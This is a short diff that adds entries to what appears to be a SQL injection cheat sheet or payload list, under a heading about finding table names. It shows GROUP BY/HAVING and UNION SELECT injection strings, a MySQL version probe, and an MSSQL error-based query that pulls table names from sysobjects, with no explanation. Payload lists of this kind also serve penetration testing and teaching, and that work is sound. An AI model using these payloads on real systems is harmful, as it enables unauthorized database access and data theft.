@@ -45,8 +45,12 @@ AND false
 
 1' GROUP BY 1,2,--+
 1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+
 
 -1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+
 
 -1 UNION SELECT 1 INTO @,@
 -1 UNION SELECT 1 INTO @,@,@
@@ -55,6 +59,7 @@ AND false
 
 ' AND MID(VERSION(),1,1) = '5';
 
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
 
 
 Finding the table name
